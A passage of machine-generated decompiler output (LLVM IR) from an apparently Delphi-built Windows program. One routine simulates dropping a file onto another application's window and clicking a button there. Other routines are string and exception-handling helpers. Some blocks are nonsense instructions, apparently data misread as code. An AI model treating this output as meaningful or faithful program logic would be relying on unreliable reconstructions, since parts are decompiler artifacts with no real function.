dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1037
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1037
  store i32 0, i32* %9, align 4, !insn.addr !1037
  %10 = call i32 @function_4036b8(), !insn.addr !1038
  %11 = call i32 @function_4036b8(), !insn.addr !1039
  %12 = call i32 @function_4036b8(), !insn.addr !1040
  %13 = call i32 @function_4036b8(), !insn.addr !1041
  %14 = call i32 @function_4036b8(), !insn.addr !1042
  %15 = call i32 @function_4036b8(), !insn.addr !1043
  %16 = call i32 @function_4036b8(), !insn.addr !1044
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1045
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1045
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1045
  store i32 %19, i32* %18, align 4, !insn.addr !1045
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1046
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1046
  store i32 4217413, i32* %21, align 4, !insn.addr !1046
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1047
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1047
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1047
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1048
  %25 = call i32 @function_405664(), !insn.addr !1049
  %26 = icmp eq i32 %25, 0, !insn.addr !1050
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1051
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1051
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !1051

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1052
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1052
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !1052
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1053
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1053
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1054
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1054
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !1054
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1055
  %34 = call i32 @function_405724(), !insn.addr !1056
  %35 = call i32 @function_4057a4(), !insn.addr !1057
  %36 = call i32 @function_405724(), !insn.addr !1058
  %37 = call i32 @function_4057a4(), !insn.addr !1059
  %38 = call i32 @"@LStrCat"(), !insn.addr !1060
  %39 = call i32 @function_405724(), !insn.addr !1061
  %40 = call i32 @function_4057a4(), !insn.addr !1062
  %41 = call i32 @"@LStrCat"(), !insn.addr !1063
  %42 = call i32 @function_405724(), !insn.addr !1064
  %43 = call i32 @function_4057a4(), !insn.addr !1065
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1066
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1066
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !1066
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1067
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1067
  store i32 %arg1, i32* %47, align 4, !insn.addr !1067
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1068
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1068
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !1068
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1069
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1069
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !1069
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1070
  %53 = call i32 @function_405724(), !insn.addr !1071
  %54 = call i32 @function_4057a4(), !insn.addr !1072
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1073
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1073
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !1073
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1074
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1074
  store i32 %arg2, i32* %58, align 4, !insn.addr !1074
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1075
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1075
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !1075
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1076
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1076
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !1076
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1077
  %64 = call i32 @function_405724(), !insn.addr !1078
  %65 = call i32 @function_4057a4(), !insn.addr !1079
  %66 = call i32 @function_405724(), !insn.addr !1080
  %67 = call i32 @function_4057a4(), !insn.addr !1081
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1082
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1082
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !1082
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1083
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1083
  store i32 %arg1, i32* %71, align 4, !insn.addr !1083
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1084
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1084
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !1084
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1085
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1085
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !1085
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1086
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1086
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !1086
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1087
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1087
  store i32 %arg2, i32* %79, align 4, !insn.addr !1087
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1088
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1088
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !1088
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1089
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1089
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !1089
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1090
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1090
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !1090
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1091
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1091
  store i32 %arg3, i32* %87, align 4, !insn.addr !1091
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1092
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1092
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !1092
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1093
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1093
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !1093
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1094
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1094
  store i32 %arg4, i32* %93, align 4, !insn.addr !1094
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1095
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1095
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !1095
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1096
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1096
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !1096
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1097
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !1097
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1098
  %101 = call i32 @function_405724(), !insn.addr !1099
  %102 = call i32 @function_4057a4(), !insn.addr !1100
  %103 = call i32 @function_405724(), !insn.addr !1101
  %104 = call i32 @function_4057a4(), !insn.addr !1102
  %105 = call i32 @function_405718(), !insn.addr !1103
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1104
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1104
  br label %dec_label_pc_405a10, !insn.addr !1104

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1105
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1105
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1106
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1107
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1108
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1108
  store i32 4217420, i32* %110, align 4, !insn.addr !1108
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1109
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1110
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1111
  ret i32 %113, !insn.addr !1112
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1113
  ret i32 %0, !insn.addr !1113
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1114
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1115
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1116
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1116
  store i32 %3, i32* %4, align 4, !insn.addr !1116
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1117
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1117
  %9 = add i8 %6, %8, !insn.addr !1117
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1117
  store i8 %9, i8* %10, align 1, !insn.addr !1117
  %11 = add i32 %2, 85, !insn.addr !1118
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1118
  %13 = load i8, i8* %12, align 1, !insn.addr !1118
  %14 = trunc i32 %1 to i8, !insn.addr !1118
  %15 = add i8 %13, %14, !insn.addr !1118
  store i8 %15, i8* %12, align 1, !insn.addr !1118
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1119
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1119
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1119
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1120
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1121
  %19 = add i32 %18, 1, !insn.addr !1121
  %20 = icmp eq i32 %19, 0, !insn.addr !1121
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1121
  %21 = icmp eq i1 %20, false, !insn.addr !1122
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1122

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1123
  %23 = call i32 @"@LStrClr"(), !insn.addr !1124
  br label %dec_label_pc_405b51, !insn.addr !1124

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1125
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1126
  ret i32 0, !insn.addr !1127
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1128
  ret i32 %0, !insn.addr !1128
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1129
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1130
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1131
  %2 = add i32 %1, -1, !insn.addr !1131
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1131
  ret i32 %0, !insn.addr !1132
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1133
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1134
  %2 = icmp eq i32 %0, 0, !insn.addr !1135
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1136
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1136

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1137
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1138
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1138
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1138
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1139
  %7 = icmp eq i1 %6, false, !insn.addr !1140
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1141
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1141

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1142
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1142
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1143
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1143
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1144
  %13 = icmp eq i1 %12, false, !insn.addr !1145
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1146
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1146

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1147
  %15 = add i32 %14, 22, !insn.addr !1148
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1149
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1149
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1150
  %18 = icmp eq i32* %17, null, !insn.addr !1151
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1152
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1152

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1153
  %20 = icmp eq i32* %19, null, !insn.addr !1154
  %21 = icmp eq i1 %20, false, !insn.addr !1155
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1155

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1156
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1156
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1156
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1157
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1158
  br label %dec_label_pc_405c7a, !insn.addr !1158

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1150
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1153
  store i32 20, i32* %19, align 4, !insn.addr !1159
  %27 = add i32 %26, 4, !insn.addr !1160
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1160
  store i32 0, i32* %28, align 4, !insn.addr !1160
  %29 = add i32 %26, 8, !insn.addr !1161
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1161
  store i32 0, i32* %30, align 4, !insn.addr !1161
  %31 = add i32 %26, 12, !insn.addr !1162
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1162
  store i32 0, i32* %32, align 4, !insn.addr !1162
  %33 = add i32 %26, 16, !insn.addr !1163
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1163
  store i32 0, i32* %34, align 4, !insn.addr !1163
  %35 = call i32 @function_4036c8(), !insn.addr !1164
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1165
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1165
  %37 = add i32 %26, 20, !insn.addr !1166
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1167
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1168
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1169
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1170
  %42 = call i32 @function_406ea8(i32 4218000, i32 2000, i32 -1), !insn.addr !1171
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1172
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1172
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1173
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1173
  %46 = icmp eq i1 %45, false, !insn.addr !1174
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1175
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1175

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1176
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1176
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1177
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1177
  br label %dec_label_pc_405c7a, !insn.addr !1177

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1178
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1178
  %51 = load i32, i32* %50, align 4, !insn.addr !1178
  ret i32 %51, !insn.addr !1179
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1180
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1180
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1180
  store i8 %6, i8* %7, align 1, !insn.addr !1180
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1181
  %10 = udiv i32 %4, 256, !insn.addr !1181
  %11 = trunc i32 %10 to i8, !insn.addr !1181
  %12 = add i8 %9, %11, !insn.addr !1181
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1181
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1181
  store i8 %12, i8* %14, align 1, !insn.addr !1181
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1182
  %17 = add i32 %4, 6, !insn.addr !1182
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1182
  %19 = zext i1 %16 to i32, !insn.addr !1182
  %20 = and i32 %4, -65536, !insn.addr !1182
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1183
  %23 = or i1 %16, %22, !insn.addr !1183
  %24 = add i32 %18, 6, !insn.addr !1183
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1183
  %26 = zext i1 %23 to i32, !insn.addr !1183
  %27 = and i32 %25, 15, !insn.addr !1183
  %28 = or i32 %27, %20, !insn.addr !1183
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1183
  %31 = or i32 %28, %30, !insn.addr !1183
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1184
  %33 = load i8, i8* %32, align 1, !insn.addr !1184
  %34 = trunc i32 %27 to i8, !insn.addr !1184
  %35 = xor i8 %33, %34, !insn.addr !1184
  store i8 %35, i8* %32, align 1, !insn.addr !1184
  %36 = add i32 %0, 1311123697, !insn.addr !1185
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1185
  %38 = load i8, i8* %37, align 1, !insn.addr !1185
  %39 = udiv i32 %3, 256, !insn.addr !1185
  %40 = trunc i32 %39 to i8, !insn.addr !1185
  %41 = add i8 %38, %40, !insn.addr !1185
  store i8 %41, i8* %37, align 1, !insn.addr !1185
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1186
  %43 = load i32, i32* %42, align 4, !insn.addr !1186
  %44 = sub i32 %43, %31, !insn.addr !1186
  store i32 %44, i32* %42, align 4, !insn.addr !1186
  %45 = add i32 %3, 117, !insn.addr !1187
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1187
  %47 = load i8, i8* %46, align 1, !insn.addr !1187
  %48 = add i8 %47, %34, !insn.addr !1187
  %49 = icmp eq i8 %48, 0, !insn.addr !1187
  store i8 %48, i8* %46, align 1, !insn.addr !1187
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1188

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1189
  %51 = trunc i32 %3 to i16, !insn.addr !1190
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1190
  %53 = load i32, i32* %52, align 4, !insn.addr !1190
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1190
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1191
  %55 = load i8, i8* %54, align 1, !insn.addr !1191
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1191
  %56 = load i8, i8* %32, align 1, !insn.addr !1192
  %57 = add i8 %56, %34, !insn.addr !1192
  store i8 %57, i8* %32, align 1, !insn.addr !1192
  %58 = call i32 @__asm_iretd(), !insn.addr !1193
  %59 = add i32 %2, -117, !insn.addr !1194
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1194
  %61 = load i8, i8* %60, align 1, !insn.addr !1194
  %62 = add i8 %61, -69, !insn.addr !1194
  store i8 %62, i8* %60, align 1, !insn.addr !1194
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1195
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1196
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1196
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1196
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1197
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1198
  %67 = add i32 %66, 1, !insn.addr !1198
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1198
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1199
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1200
  ret i32 0, !insn.addr !1201

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1202
  store i32 %69, i32* %ebx, align 4, !insn.addr !1203
  %70 = icmp slt i32 %69, 0, !insn.addr !1204
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1205

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1206
  store i32 %71, i32* %ebx, align 4, !insn.addr !1206
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1207
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1208
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1209
  %75 = call i32 @function_403c90(), !insn.addr !1210
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1211
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1212
  br label %dec_label_pc_405d79, !insn.addr !1212

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1213
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1214
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1214
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1214
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1215
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1216
  %3 = add i32 %2, 1, !insn.addr !1216
  %4 = icmp eq i32 %3, 0, !insn.addr !1216
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1216
  %5 = icmp eq i1 %4, false, !insn.addr !1217
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1217

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1218
  br label %dec_label_pc_405da9, !insn.addr !1218

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1219
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1220
  ret i32 0, !insn.addr !1221
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1222
  ret i32 %0, !insn.addr !1222
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1223
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1224
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1225
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1225
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1225
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1226
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1227
  %3 = add i32 %2, -1, !insn.addr !1227
  %4 = icmp eq i32 %2, 0, !insn.addr !1227
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1227
  %5 = icmp eq i1 %4, false, !insn.addr !1228
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1228

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1229
  br label %dec_label_pc_405df4, !insn.addr !1230

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1231
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1232
  ret i32 0, !insn.addr !1233
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1234
  ret i32 %0, !insn.addr !1234
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
